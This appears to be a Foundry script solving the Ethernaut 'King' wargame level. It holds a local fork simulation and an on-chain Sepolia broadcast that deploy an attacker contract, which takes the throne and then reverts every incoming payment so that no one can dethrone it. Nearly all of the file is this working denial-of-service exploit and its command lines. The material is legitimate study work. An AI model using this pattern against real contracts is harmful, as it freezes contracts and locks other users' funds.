// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

// cast interface src/King.sol:King
interface IKing {
    function _king() external view returns (address);
    function owner() external view returns (address);
    function prize() external view returns (uint256);
}

// $ forge script script/KingExp.s.sol:ForkExp
// $ forge script script/KingExp.s.sol:ForkExp --fork-url $SEPOLIA_RPC_URL -vvvvv
//   king is  0x3049C00639E6dfC269ED1451764a046f7aE500c6
//   prize is  1000000000000000
//   owner is  0x3049C00639E6dfC269ED1451764a046f7aE500c6
contract ForkExp is Script {
    IKing public contractInstance;
    address deployer = makeAddr("deployer"); // 0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946
    address attacker = makeAddr("attacker"); // 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
    uint256 inicialPrize = 100 wei;

    function run() external {
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IKing(address(new King{value: 99 wei}()));
            vm.stopPrank();
        } else if (chainId == 11155111) {
            contractInstance = IKing(payable(0x0B2398Da497eEd6b72CBD4878548873103060CBF));
        } else {
            return;
        }

        console2.log("Running in testUnlokeVault...");
        vm.startPrank(attacker); // Set msg.sender to the attacker address
        printInfo(address(contractInstance));
        Attacter attackerInstance = new Attacter{value: inicialPrize}(payable(address(contractInstance)));
        console2.log("attackerInstance address is ", address(attackerInstance));
        console2.log("attackerInstance balance is ", address(attackerInstance).balance);
        attackerInstance.attack();
        printInfo(address(contractInstance));

        Attacter attackerInstance2 = new Attacter{value: inicialPrize + 1}(payable(address(contractInstance)));
        console2.log("attackerInstance2 address is ", address(attackerInstance2));
        console2.log("attackerInstance2 balance is ", address(attackerInstance2).balance);
        attackerInstance2.attack();
        printInfo(address(contractInstance));
        vm.stopPrank();
    }

    function printInfo(address _addr) internal view returns (address owner, uint256 prize, address king) {
        bytes32 result = vm.load(_addr, bytes32(uint256(1)));
        prize = uint256(result);

        result = vm.load(_addr, bytes32(uint256(0)));
        king = address(uint160(uint256(result)));

        result = vm.load(_addr, bytes32(uint256(2)));
        owner = address(uint160(uint256(result)));

        console2.log("king is ", king);
        console2.log("prize is ", prize);
        console2.log("owner is ", owner);
    }
}

// $ forge script script/KingExp.s.sol:onChainExp --fork-url $SEPOLIA_RPC_URL -vvvvv
// $ forge script script/KingExp.s.sol:onChainExp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ make kingExp ARGS='--network sepolia'
// cast storage 0x0B2398Da497eEd6b72CBD4878548873103060CBF 0 --rpc-url $SEPOLIA_RPC_URL //king
// cast storage 0x0B2398Da497eEd6b72CBD4878548873103060CBF 1 --rpc-url $SEPOLIA_RPC_URL //prize
// cast storage 0x0B2398Da497eEd6b72CBD4878548873103060CBF 2 --rpc-url $SEPOLIA_RPC_URL //owner
contract onChainExp is Script {
    IKing public contractInstance = IKing(0x0B2398Da497eEd6b72CBD4878548873103060CBF);
    // 设置msg.sender为攻击者地址
    // 1 --sender $ACCOUNT_SEPOLIA
    // 2 attackContract.attack(tx.origin);
    // 3 从环境变量中取地址 export ATTACKER=0xYourAddress
    // attackContract.attack(vm.envAddress("ATTACKER"));
    //  vm.startBroadcast(attacker); // 指定广播的地址
    //  attackContract.attack(attacker); // 传入你控制的攻击地址

    function run() external {
        vm.startBroadcast();
        uint256 prize = contractInstance.prize();
        Attacter attackerInstance = new Attacter{value: prize + 1}(payable(address(contractInstance)));
        console2.log("attackerInstance address is ", address(attackerInstance));
        console2.log("attackerInstance balance is ", address(attackerInstance).balance);
        attackerInstance.attack();
        console2.log("king is ", contractInstance._king());
        vm.stopBroadcast();
    }
}

contract Attacter {
    address payable public contractInstance;

    constructor(address payable _contractInstance) payable {
        contractInstance = _contractInstance;
    }

    function attack() public payable {
        uint256 balance = address(this).balance;
        console2.log("attack amount is ", balance);
        (bool success,) = contractInstance.call{value: balance}("");
        require(success, "Failed to send ETH");
    }

    receive() external payable {
        console2.log("call attackter receive");
        revert("You shall not dethrone me!");
    }
}
